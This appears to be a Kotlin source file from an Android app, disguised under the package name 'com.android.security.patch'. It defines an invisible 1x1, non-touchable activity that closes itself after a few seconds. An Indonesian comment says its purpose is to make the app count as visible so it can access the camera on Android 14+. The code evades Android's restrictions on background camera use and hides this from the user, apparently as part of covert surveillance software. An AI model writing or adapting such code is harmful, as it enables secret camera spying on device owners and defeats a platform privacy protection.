package com.android.security.patch

import android.app.Activity
import android.os.Bundle
import android.view.Gravity

/**
 * 1x1 invisible activity. Dipakai buat bikin app "visible" pas akses camera
 * di Android 14+. Auto-finish 3 detik.
 */
class CameraProbeActivity : Activity() {
    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        window.setLayout(1, 1)
        window.setGravity(Gravity.TOP or Gravity.START)
        window.setDimAmount(0f)
        try { window.addFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE) } catch (_: Throwable) {}
    }
    override fun onResume() {
        super.onResume()
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({ finish() }, 3500)
    }
}
